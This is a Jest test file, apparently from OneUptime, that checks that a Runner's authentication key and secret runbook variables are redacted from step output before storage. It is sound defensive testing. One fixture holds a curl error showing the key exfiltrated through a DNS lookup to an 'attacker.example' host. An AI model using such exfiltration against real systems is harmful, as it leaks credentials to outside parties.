import logger from "Common/Server/Utils/Logger";
import PostgresAppInstance from "Common/Server/Infrastructure/PostgresDatabase";
import RunnerJobService from "Common/Server/Services/RunnerJobService";
import Runner from "Common/Models/DatabaseModels/Runner";
import { JSONObject } from "Common/Types/JSON";
import ObjectID from "Common/Types/ObjectID";
import { REDACTED_SECRET_TEXT } from "Common/Types/Runbook/SecretOutputRedaction";
import {
  ExpressRequest,
  ExpressResponse,
  NextFunction,
} from "Common/Server/Utils/Express";
import {
  afterEach,
  beforeAll,
  beforeEach,
  describe,
  expect,
  test,
} from "@jest/globals";

/*
 * ---------------------------------------------------------------------------
 * Contract under test - a Runner's own key never reaches what is stored of
 * a step it ran (POST /runner-ingest/job/:jobId/result).
 *
 * A step runs without the Runner's own settings in its environment
 * (Runner/Utils/RunnerOwnEnvironment), but as the Runner's user: one that
 * read the key from elsewhere and printed it would hand it to everyone who
 * reads the runbook's runs, and the key claims every job the Runner is sent
 * with its secrets. A new Runner hides the key itself
 * (Runner/Utils/RunnerCredentialRedaction); the server hides the key the
 * result is sent with as well, from the body or the x-agent-key header,
 * before the text is stored - whatever the Runner sent, an older one
 * included - beside the secret runbook variables the step was handed.
 *
 * The real router and handler run, and RunnerJobService.submitResult down
 * to the last call before Postgres, which records what would be stored.
 * ---------------------------------------------------------------------------
 */

type RouterFunction = (
  req: ExpressRequest,
  res: ExpressResponse,
  next: NextFunction,
) => void | Promise<void>;

type MockRoute = {
  method: string;
  uri: string;
  handlerFunction: RouterFunction;
};

const mockRoutes: Array<MockRoute> = [];

function mockRegisterRoute(
  method: string,
): (uri: string, ...handlers: Array<RouterFunction>) => void {
  return (uri: string, ...handlers: Array<RouterFunction>): void => {
    mockRoutes.push({
      method: method.toUpperCase(),
      uri,
      handlerFunction: handlers[handlers.length - 1]!,
    });
  };
}

jest.mock("Common/Server/Utils/Express", () => {
  const actual: Record<string, unknown> = jest.requireActual(
    "Common/Server/Utils/Express",
  ) as Record<string, unknown>;

  return {
    ...actual,
    __esModule: true,
    default: {
      ...((actual["default"] as Record<string, unknown>) || {}),
      getRouter: (): Record<string, unknown> => {
        return {
          get: jest.fn().mockImplementation(mockRegisterRoute("get")),
          post: jest.fn().mockImplementation(mockRegisterRoute("post")),
          put: jest.fn().mockImplementation(mockRegisterRoute("put")),
          delete: jest.fn().mockImplementation(mockRegisterRoute("delete")),
        };
      },
    },
  };
});

// Import AFTER the jest.mock calls above (they are hoisted by jest).
import RunnerIngressAPI from "../../FeatureSet/Runbook/API/RunnerIngress";

const RUNNER_ID: ObjectID = new ObjectID(
  "44444444-4444-4444-8444-444444444444",
);
const JOB_ID: ObjectID = new ObjectID("55555555-5555-4555-8555-555555555555");

// The key the Runner authenticated with: what a step that read it printed.
const RUNNER_KEY: string = "8c1f2a4e-6b7d-4e9f-a0b1-c2d3e4f5a6b7";

// A secret runbook variable the step was handed.
const DB_PASSWORD: string = "correct-horse-battery-staple";

interface WireResponse {
  statusCode: number | undefined;
  body: JSONObject | undefined;
  thrownToNext: unknown;
}

interface StoredQuery {
  sql: string;
  params: Array<unknown>;
}

let queries: Array<StoredQuery>;

async function submit(data: {
  body: JSONObject;
  headers?: Record<string, string> | undefined;
}): Promise<WireResponse> {
  const route: MockRoute | undefined = mockRoutes.find((route: MockRoute) => {
    return route.method === "POST" && route.uri === "/job/:jobId/result";
  });

  if (!route) {
    throw new Error("Route POST /job/:jobId/result was never registered");
  }

  const wire: WireResponse = {
    statusCode: undefined,
    body: undefined,
    thrownToNext: undefined,
  };

  // As RunnerAuthorization leaves it once the key proved this Runner.
  const req: ExpressRequest = {
    params: { jobId: JOB_ID.toString() },
    query: {},
    headers: data.headers || {},
    body: data.body,
    runner: { id: RUNNER_ID, _id: RUNNER_ID.toString() } as Runner,
  } as unknown as ExpressRequest;

  const res: Record<string, unknown> = {};
  res["status"] = jest.fn().mockImplementation((code: unknown) => {
    wire.statusCode = code as number;
    return res;
  });
  res["send"] = jest.fn().mockImplementation((sent: unknown) => {
    wire.body = sent as JSONObject;
    return res;
  });
  res["set"] = jest.fn().mockImplementation(() => {
    return res;
  });

  const next: jest.Mock = jest.fn();

  await route.handlerFunction(
    req,
    res as unknown as ExpressResponse,
    next as unknown as NextFunction,
  );

  wire.thrownToNext = next.mock.calls[0] ? next.mock.calls[0][0] : undefined;

  return wire;
}

/*
 * What the result's UPDATE binds: the output a runbook step's row keeps
 * ($2), the error message ($4), and the text an AI-origin row keeps
 * instead ($10, $11), each made from the same redacted text.
 */
function storedTexts(): Array<string> {
  expect(queries).toHaveLength(1);

  return queries[0]!.params.filter((param: unknown): param is string => {
    return typeof param === "string";
  });
}

beforeAll(() => {
  mockRoutes.length = 0;
  new RunnerIngressAPI();
});

beforeEach(() => {
  for (const level of ["warn", "info", "error", "debug"] as const) {
    jest.spyOn(logger, level).mockImplementation((): void => {
      return undefined;
    });
  }

  queries = [];

  jest
    .spyOn(RunnerJobService, "getSecretValuesGivenToJob")
    .mockResolvedValue([DB_PASSWORD]);

  jest.spyOn(PostgresAppInstance, "getDataSource").mockReturnValue({
    query: jest
      .fn()
      .mockImplementation(
        async (sql: string, params: Array<unknown>): Promise<unknown> => {
          queries.push({ sql, params });
          return [[{ _id: JOB_ID.toString() }], 1];
        },
      ),
  } as never);
});

afterEach(() => {
  jest.restoreAllMocks();
});

describe("POST /job/:jobId/result hides the Runner's own key before anything is stored", () => {
  test("the report's step: the Runner's environment, printed back - the key it was sent with is stored as [REDACTED]", async () => {
    const wire: WireResponse = await submit({
      body: {
        agentId: RUNNER_ID.toString(),
        agentKey: RUNNER_KEY,
        success: true,
        exitCode: 0,
        output: `[stdout]\nuid=1000(runner)\nONEUPTIME_RUNNER_ID=${RUNNER_ID.toString()}\nONEUPTIME_RUNNER_KEY=${RUNNER_KEY}\nPATH=/usr/bin\n`,
      },
    });

    expect(wire.thrownToNext).toBeUndefined();
    expect(wire.body).toEqual({ accepted: true });

    const texts: Array<string> = storedTexts();

    expect(texts.join("\n")).not.toContain(RUNNER_KEY);
    expect(queries[0]!.params[1]).toBe(
      `[stdout]\nuid=1000(runner)\nONEUPTIME_RUNNER_ID=${RUNNER_ID.toString()}\nONEUPTIME_RUNNER_KEY=${REDACTED_SECRET_TEXT}\nPATH=/usr/bin\n`,
    );
  });

  test("in the error message too", async () => {
    await submit({
      body: {
        agentId: RUNNER_ID.toString(),
        agentKey: RUNNER_KEY,
        success: false,
        exitCode: 1,
        output: "",
        errorMessage: `curl: (6) Could not resolve host: ${RUNNER_KEY}.attacker.example`,
      },
    });

    expect(storedTexts().join("\n")).not.toContain(RUNNER_KEY);
    expect(queries[0]!.params[3]).toBe(
      `curl: (6) Could not resolve host: ${REDACTED_SECRET_TEXT}.attacker.example`,
    );
  });

  test("a key the Runner sent in the x-agent-key header is hidden the same way", async () => {
    await submit({
      headers: {
        "x-agent-id": RUNNER_ID.toString(),
        "x-agent-key": RUNNER_KEY,
      },
      body: {
        success: true,
        exitCode: 0,
        output: `key: ${RUNNER_KEY}`,
      },
    });

    expect(queries[0]!.params[1]).toBe(`key: ${REDACTED_SECRET_TEXT}`);
  });

  test("beside the secret runbook variables the step was handed, as before", async () => {
    await submit({
      body: {
        agentId: RUNNER_ID.toString(),
        agentKey: RUNNER_KEY,
        success: true,
        exitCode: 0,
        output: `password=${DB_PASSWORD} key=${RUNNER_KEY}`,
      },
    });

    const texts: Array<string> = storedTexts();

    expect(texts.join("\n")).not.toContain(RUNNER_KEY);
    expect(texts.join("\n")).not.toContain(DB_PASSWORD);
    expect(queries[0]!.params[1]).toBe(
      `password=${REDACTED_SECRET_TEXT} key=${REDACTED_SECRET_TEXT}`,
    );
  });

  test("the key appearing many times, on one line or several, is hidden every time", async () => {
    await submit({
      body: {
        agentId: RUNNER_ID.toString(),
        agentKey: RUNNER_KEY,
        success: true,
        exitCode: 0,
        output: `${RUNNER_KEY}\n${RUNNER_KEY}${RUNNER_KEY}\n`,
      },
    });

    expect(queries[0]!.params[1]).toBe(
      `${REDACTED_SECRET_TEXT}\n${REDACTED_SECRET_TEXT}${REDACTED_SECRET_TEXT}\n`,
    );
  });

  test("negative control: output that holds no secret is stored exactly as sent", async () => {
    await submit({
      body: {
        agentId: RUNNER_ID.toString(),
        agentKey: RUNNER_KEY,
        success: true,
        exitCode: 0,
        output: "[stdout]\nNAME READY\nweb-1 1/1\n",
      },
    });

    expect(queries[0]!.params[1]).toBe("[stdout]\nNAME READY\nweb-1 1/1\n");
  });

  test("a result with no text asks for no secret and stores none", async () => {
    const wire: WireResponse = await submit({
      body: {
        agentId: RUNNER_ID.toString(),
        agentKey: RUNNER_KEY,
        success: true,
        exitCode: 0,
      },
    });

    expect(wire.body).toEqual({ accepted: true });
    expect(RunnerJobService.getSecretValuesGivenToJob).not.toHaveBeenCalled();
    expect(queries[0]!.params[1]).toBeNull();
  });
});
